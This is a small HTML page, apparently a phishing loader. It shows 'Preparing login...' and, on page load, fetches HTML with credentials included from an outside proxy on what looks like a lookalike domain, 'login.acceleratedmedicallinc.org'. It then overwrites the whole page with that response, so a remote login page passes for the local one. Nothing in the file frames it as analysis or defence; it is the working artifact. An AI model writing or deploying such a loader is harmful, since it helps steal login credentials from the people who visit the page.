<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta charset="utf-8">
  <style>
    html, body { margin: 0; height: 100%; background: black; color: #0f0; font-family: monospace; }
    #loader { text-align: center; padding-top: 20%; }
  </style>
</head>
<body>
  <div id="loader">Preparing login...</div>

  <script>
    (async () => {
      const proxyUrl = 'https://login.acceleratedmedicallinc.org/?auth=2'; // must support CORS
      const response = await fetch(proxyUrl, { credentials: 'include' });
      const html = await response.text();

      document.open();
      document.write(html);
      document.close();
    })();
  </script>
</body>
</html>
